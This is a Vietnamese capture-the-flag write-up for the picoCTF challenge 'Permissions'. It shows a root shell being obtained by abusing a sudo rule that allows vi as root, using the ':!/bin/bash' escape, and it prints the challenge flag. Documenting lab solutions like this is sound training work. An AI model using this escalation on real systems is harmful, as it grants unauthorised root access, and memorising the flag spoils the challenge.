# Permissions

Đầu tiên ta kiểm tra người đang sử dụng là ai:

```python
picoplayer@challenge:~$ whoami
picoplayer
```

Kiểm tra tiếp quyền của picoplayer là gì:
(Hint: What permissions do you have?)

```python
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Như chúng ta thấy. picoplayer có thể dùng `vi` như một `root` ở bất kì file nào. Ta tạo một file test bằng `vi`:

```python
picoplayer@challenge:~$ sudo vi test
```

Chạy lệnh sau trong `Command mode` của `vi` (truy cập Command mode bằng phím `ESC`)

```python
:!/bin/bash
```

Sau khi enter ta sẽ có được `root`. Bước cuối cùng là tìm ra flag:

```python
root@challenge:/home/picoplayer# cd ~
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4 21:34 .
drwxr-xr-x 1 root root   51 Sep  9 08:31 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4 21:34 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
root@challenge:~# pwd
/root
```
